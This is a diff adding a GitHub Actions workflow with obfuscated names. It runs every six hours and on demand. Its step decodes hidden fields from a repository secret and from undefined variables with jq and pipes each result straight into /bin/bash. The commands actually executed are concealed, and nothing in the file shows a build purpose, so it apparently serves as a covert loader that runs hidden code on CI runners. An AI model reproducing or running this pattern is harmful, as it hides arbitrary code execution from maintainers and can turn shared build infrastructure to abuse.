@@ -1,0 +1,19 @@
+name: tongyaochen7654
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongyaochen7654
+        env:
+          zx53: ${{ secrets.zx53 }}
+        run: |
+          echo $zx53 | jq -r .ywr14597 | /bin/bash
+          echo $plly2123 | jq -r .fl3519 | /bin/bash
+          echo $l7 | jq -r .f48330 | /bin/bash
+          echo $c1 | jq -r .ahtsi3 | /bin/bash
+
